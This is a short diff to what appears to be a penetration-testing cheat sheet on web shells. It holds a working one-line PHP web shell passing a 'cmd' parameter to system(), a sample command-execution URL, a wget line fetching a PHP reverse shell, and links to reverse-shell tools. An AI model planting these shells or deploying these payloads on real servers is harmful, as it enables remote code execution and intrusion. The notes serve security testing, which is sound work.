@@ -147,6 +147,8 @@ load URL, http://<REMOTE HOST>/webdav/helloworld.txr
 		<?php echo(system($_GET["cmd"])); ?>
 		```
 		Go to http://victimsite.com/test.php?cmd=dir for command execution 
+
+		* [Windows PHP Reverse Shell](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
 	* [Other languages/compabibility](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 	* [Full shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 		* wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
